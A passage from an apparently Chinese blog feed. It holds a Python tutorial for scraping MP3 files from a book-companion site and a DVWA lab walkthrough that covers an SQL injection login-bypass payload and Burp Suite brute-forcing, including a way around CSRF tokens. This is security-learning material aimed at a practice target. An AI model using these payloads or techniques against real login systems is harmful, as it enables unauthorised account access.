class="hljs-comment">&lt;!--源码--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;audio_media&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">preload</span>=<span class="hljs-string">&quot;auto&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn14.bookln.cn/tm1022544_553b013e8f1b3b834e568e4304486fc5c071519b.mp3&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">audio</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>要下载的音频在audio标签下，id为audio_media的src内。</p><p>搜索了整个页面，也就只有这一个audio标签。</p><p>所以获取这个标签下的src值即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>download_nrl=<span class="hljs-string">&quot;https://mp.zhizhuma.com/qr.html?crcode=120D62W6CDD&quot;</span><br>soup = BeautifulSoup(urlopen(download_nrl),<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>mp3_all = soup.find_all(<span class="hljs-string">&#x27;audio&#x27;</span>)<br>  <span class="hljs-keyword">for</span> mp3_li <span class="hljs-keyword">in</span> mp3_all:  <span class="hljs-comment">#获取src</span><br>mp3 = mp3_li[<span class="hljs-string">&#x27;src&#x27;</span>]<br><span class="hljs-built_in">print</span>(mp3)<br></code></pre></td></tr></table></figure><p>成功获得了链接，使用urllib进行下载。</p><p>测试一下是否能下载成功。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#格式</span><br><span class="hljs-comment">#urllib.request.urlretrieve(url,path+name) #可不加路径</span><br><span class="hljs-keyword">import</span> urllib.request<br>mp3_url=<span class="hljs-string">&#x27;https://cdn14.bookln.cn/tm1022544_553b013e8f1b3b834e568e4304486fc5c071519b.mp3&#x27;</span><br><span class="hljs-keyword">try</span>:<br>name=<span class="hljs-string">&#x27;1.mp3&#x27;</span><br>urllib.request.urlretrieve(mp3_url,name)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;下载完成。&quot;</span>)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;下载失败。&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%888.12.26.png" alt="截屏2022-03-30 下午8.12.26"></p><p>下载成功。</p><p>查看目录页面源码。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%888.33.19.png" alt="截屏2022-03-30 下午8.33.19"></p><p>链接在val参数里。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%888.44.10.png" alt="截屏2022-03-30 下午8.44.10"></p><p>都在同一个的class里。</p><p>尝试爬取val参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen<br>url = <span class="hljs-string">&#x27;https://mp.zhizhuma.com/book.htm?id=111541&amp;sign=ca9627#22118679&#x27;</span><br>soup = BeautifulSoup(urlopen(url),<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>li_all = soup.find_all(<span class="hljs-string">&#x27;div&#x27;</span>,attrs=&#123;<span class="hljs-string">&#x27;class&#x27;</span>:<span class="hljs-string">&#x27;section-wrapper&#x27;</span>&#125;)<br><span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> li_all:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;---&#x27;</span>)<br><span class="hljs-built_in">print</span>(li[<span class="hljs-string">&#x27;val&#x27;</span>])<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%889.01.36.png" alt="截屏2022-03-30 下午9.01.36" style="zoom:33%;" /><p>由于链接不全，再循环拼接一下域名，拼接后存放进列表link。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">link=[]<br>soup_url = BeautifulSoup(urlopen(url),<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>li_all = soup_url.find_all(<span class="hljs-string">&#x27;div&#x27;</span>,attrs=&#123;<span class="hljs-string">&#x27;class&#x27;</span>:<span class="hljs-string">&#x27;section-wrapper&#x27;</span>&#125;)<br><span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> li_all:<br>  link = <span class="hljs-string">&#x27;https://mp.zhizhuma.com&#x27;</span>+li[<span class="hljs-string">&#x27;val&#x27;</span>]<br>  url_list.append(link)<br><br></code></pre></td></tr></table></figure><p>接下来将代码进行整理拼接。</p><h2 id="3-代码"><a href="#3-代码" class="headerlink" title="3.代码"></a>3.代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_url</span>(<span class="hljs-params">url</span>):  <span class="hljs-comment">#获取mp3链接所在页面的链接，并存入列表url_list</span><br>soup_url = BeautifulSoup(urlopen(url),<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>li_all = soup_url.find_all(<span class="hljs-string">&#x27;div&#x27;</span>,attrs=&#123;<span class="hljs-string">&#x27;class&#x27;</span>:<span class="hljs-string">&#x27;section-wrapper&#x27;</span>&#125;)<br><span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> li_all:<br>link = <span class="hljs-string">&#x27;https://mp.zhizhuma.com&#x27;</span>+li[<span class="hljs-string">&#x27;val&#x27;</span>]<br>url_list.append(link)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_mp3url</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<span class="hljs-comment">#获取mp3链接</span><br>soup_mp3 = BeautifulSoup(urlopen(<span class="hljs-built_in">str</span>),<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>mp3_all = soup_mp3.find_all(<span class="hljs-string">&#x27;audio&#x27;</span>)<br><span class="hljs-keyword">global</span> mp3<br><span class="hljs-keyword">for</span> mp3_li <span class="hljs-keyword">in</span> mp3_all:<br>mp3 = mp3_li[<span class="hljs-string">&#x27;src&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_mp3</span>(<span class="hljs-params">mp3_url</span>): <span class="hljs-comment">#下载mp3文件，并保存在当前文件夹</span><br><span class="hljs-keyword">try</span>:<br>pathname=<span class="hljs-built_in">str</span>(num)+<span class="hljs-string">&#x27;.mp3&#x27;</span> <br>urllib.request.urlretrieve(mp3_url,pathname)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;下载成功&quot;</span>,pathname)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;下载失败。&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>url_list=[]<br>num=<span class="hljs-number">0</span> <span class="hljs-comment">#计数用</span><br>url = <span class="hljs-string">&#x27;https://mp.zhizhuma.com/book.htm?id=111541&amp;sign=ca9627#22118679&#x27;</span><br>get_url(url) <span class="hljs-comment">#获取mp3所在页面的所有链接</span><br><span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> url_list:<br>get_mp3url(url)<br>num+=<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;获得链接&#x27;</span>,num,<span class="hljs-string">&#x27;为&#x27;</span>,mp3)<br>download_mp3(mp3)<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%8810.57.20.png" alt="截屏2022-03-30 下午10.57.20" style="zoom:33%;" /><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%8811.00.09.png" alt="截屏2022-03-30 下午11.00.09" style="zoom: 33%;" /><p>下载成功！</p><h2 id="4-出现的问题及解决方案"><a href="#4-出现的问题及解决方案" class="headerlink" title="4.出现的问题及解决方案"></a>4.出现的问题及解决方案</h2><p><strong>报错出现TypeError: ‘NoneType’ object is not subscriptable：</strong></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%8810.14.13.png" alt="截屏2022-03-30 下午10.14.13"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_mp3url</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>soup_mp3 = BeautifulSoup(urlopen(<span class="hljs-built_in">str</span>),<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>mp3_all = soup_mp3.find_all(<span class="hljs-string">&#x27;audio&#x27;</span>)<br>mp3 = soup_mp3.audio[<span class="hljs-string">&#x27;src&#x27;</span>]<br>mp3_list.append(mp3)<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><p>发现是mp3 &#x3D; soup_mp3.audio[‘src’]这一句会报错。</p><p>改成循环读取就不会了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> mp3_i <span class="hljs-keyword">in</span> mp3_all:<br>mp3 = mp3_i[<span class="hljs-string">&#x27;src&#x27;</span>]<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%8810.18.03.png" alt="截屏2022-03-30 下午10.18.03"></p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>旧文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA全部分学习</title>
    <link href="/2021/07/06/old/dvwa2/"/>
    <url>/2021/07/06/old/dvwa2/</url>
    
    <content type="html"><![CDATA[<h1 id="一、docker搭建dvwa"><a href="#一、docker搭建dvwa" class="headerlink" title="一、docker搭建dvwa"></a>一、docker搭建dvwa</h1><h2 id="1-搜索dvwa"><a href="#1-搜索dvwa" class="headerlink" title="1.搜索dvwa"></a>1.搜索dvwa</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker search dvwa</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628104508081.png" alt="image-20210628104508081"></p><span id="more"></span><h2 id="2-拉取选中的镜像"><a href="#2-拉取选中的镜像" class="headerlink" title="2.拉取选中的镜像"></a>2.拉取选中的镜像</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull citizenstig/dvwa<br></code></pre></td></tr></table></figure><h2 id="3-查看镜像是否拉取成功"><a href="#3-查看镜像是否拉取成功" class="headerlink" title="3.查看镜像是否拉取成功"></a>3.查看镜像是否拉取成功</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker images</span><br></code></pre></td></tr></table></figure><h2 id="4-运行"><a href="#4-运行" class="headerlink" title="4.运行"></a>4.运行</h2><p>临时：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="language-bash"> --<span class="hljs-built_in">rm</span> -it -p 80:80 citizenstig/dvwa</span><br></code></pre></td></tr></table></figure><p>创建容器：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">80</span>:<span class="hljs-number">80</span> citizenstig/dvwa<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628104846227.png" alt="image-20210628104846227"></p><p>默认账号密码：admin&#x2F;password</p><h1 id="二、brute-force（爆破）"><a href="#二、brute-force（爆破）" class="headerlink" title="二、brute force（爆破）"></a>二、brute force（爆破）</h1><p>界面：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20210628114113729.png" alt="image-20210628114113729"></p><h2 id="1-low"><a href="#1-low" class="headerlink" title="1.low"></a>1.low</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628110149915.png" alt="image-20210628110149915"></p><p>传入账号和密码，使用sql语句进行查询，并没有进行过滤和验证。</p><p>使用万能密码<code>admin&#39;or&#39;1&#39;=&#39;1-- -</code>可以登陆。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628111035077.png" alt="image-20210628111035077"></p><p>但属于bruteforce区，所以使用bp爆破。</p><p>使用bp抓包。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628111131573.png" alt="image-20210628111131573"></p><p>右键sent to intruder，在知道账号为admin的情况下，选择attack type为sniper模式。</p><p>clear清理标记，add选择爆破点。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628111321375.png" alt="image-20210628111321375"></p><p>载入payloads</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628113608984.png" alt="image-20210628113608984"></p><p>attack！</p><p>排列长度，password和其他payload长度不同。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628112008352.png" alt="image-20210628112008352"></p><p>查看回包，显示登录成功：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628113846234.png" alt="image-20210628113846234"></p><h2 id="2-medium"><a href="#2-medium" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p><p>![image-20210628114354022](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210628114354022.png)</p><p>源码显示，login failed需要sleep（2）。也就意味着，每一次密码输入错误都会暂停两秒钟，大大增加了爆破的时间。</p><p>爆破试验一下，显然速度变慢了，但并不能阻止爆破。<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628140838768.png" alt="image-20210628140838768"></p><p>但密码仍然可以爆破出来。</p><p>输入的用户名和密码使用了mysql_real_escape_string() 函数进行了过滤，sql注入被防御。</p><blockquote><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p><p>下列字符受影响：</p><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>‘</li><li>“</li><li>\x1a</li></ul><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p></blockquote><h2 id="3-high"><a href="#3-high" class="headerlink" title="3.high"></a>3.high</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628153013911.png" alt="image-20210628153013911"></p><p>依然使用了mysql_real_escape_string()函数，还使用 stripslashes() 函数删除反斜杠无法进行sql注入。</p><p>比起medium，第一行多了一个checktoken（令牌检查）。</p><blockquote><p>什么是token？</p><p>1、Token的引入：Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。</p><p>2、Token的定义：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。</p><p>3、使用Token的目的：Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。</p></blockquote><p>token用于防止重复提交。</p><p>抓包发现此时的get值多了一个<strong>user_token</strong>。</p><p>尝试多次提交后，返回信息变成了302。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628154629783.png" alt="image-20210628154629783"></p><p>显示<strong>csrf token is incorrect</strong>。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628154752412.png" alt="image-20210628154752412"></p><p>sent to intruder，attack type选择<strong>pitchfork</strong>。</p><blockquote><p>关于attack的四种模式</p><p><strong>1.Sniper</strong></p><p>这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p><p><strong>2.Battering ram</strong>  </p><p>这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中</p><p><strong>3.pitchfork</strong></p><p> 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量</p><p><strong>4.Cluster bomb</strong></p><p> 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</p></blockquote><p>Payload1选择和之前的一样，<strong>simple list</strong>，导入密码字典。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628162413546.png" alt="image-20210628162413546"></p><p>第二个payload需要先选择<strong>option</strong>，找到<strong>grep-extract</strong>，选择add。</p><p>点击<strong>fetch response</strong>，找到user_token的value位置，选中。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628163432187.png" alt="image-20210628163432187"></p><p>payload2的payload type设置为<strong>recursive grep</strong>（递归查找文件里符合条件的字符串）。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628164448476.png" alt="image-20210628164448476"></p><p>option下线程要设置成1，该模式下无法多线程。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628170043112.png" alt="image-20210628170043112"></p><p>设置redirctions（重定向）为always。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628165536718.png" alt="image-20210628165536718"></p><p>爆破！</p><p>回显成功！</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628165704513.png" alt="image-20210628165704513"></p><h2 id="4-impossible"><a href="#4-impossible" class="headerlink" title="4.impossible"></a>4.impossible</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Sanitise username input</span><br>    <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$user</span> );<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>( <span class="hljs-variable">$user</span> );<br><br>    <span class="hljs-comment">// Sanitise password input</span><br>    <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass</span> );<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>( <span class="hljs-variable">$pass</span> );<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass</span> );<br><br>    <span class="hljs-comment">// Default values</span><br>    <span class="hljs-variable">$total_failed_login</span> = <span class="hljs-number">3</span>;<br>    <span class="hljs-variable">$lockout_time</span>       = <span class="hljs-number">15</span>;<br>    <span class="hljs-variable">$account_locked</span>     = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-comment">// Check the database (Check user information)</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br><br>    <span class="hljs-comment">// Check to see if the user has been locked out.</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">rowCount</span>() == <span class="hljs-number">1</span> ) &amp;&amp; ( <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;failed_login&#x27;</span> ] &gt;= <span class="hljs-variable">$total_failed_login</span> ) )  &#123;<br>        <span class="hljs-comment">// User locked out.  Note, using this method would allow for user enumeration!</span><br>        <span class="hljs-comment">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span><br><br>        <span class="hljs-comment">// Calculate when the user would be allowed to login again</span><br>        <span class="hljs-variable">$last_login</span> = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;last_login&#x27;</span> ];<br>        <span class="hljs-variable">$last_login</span> = <span class="hljs-title function_ invoke__">strtotime</span>( <span class="hljs-variable">$last_login</span> );<br>        <span class="hljs-variable">$timeout</span>    = <span class="hljs-title function_ invoke__">strtotime</span>( <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$last_login&#125;</span> +<span class="hljs-subst">&#123;$lockout_time&#125;</span> minutes&quot;</span> );<br>        <span class="hljs-variable">$timenow</span>    = <span class="hljs-title function_ invoke__">strtotime</span>( <span class="hljs-string">&quot;now&quot;</span> );<br><br>        <span class="hljs-comment">// Check to see if enough time has passed, if it hasn&#x27;t locked the account</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$timenow</span> &gt; <span class="hljs-variable">$timeout</span> )<br>            <span class="hljs-variable">$account_locked</span> = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Check the database (if username matches the password)</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span>);<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:password&#x27;</span>, <span class="hljs-variable">$pass</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span 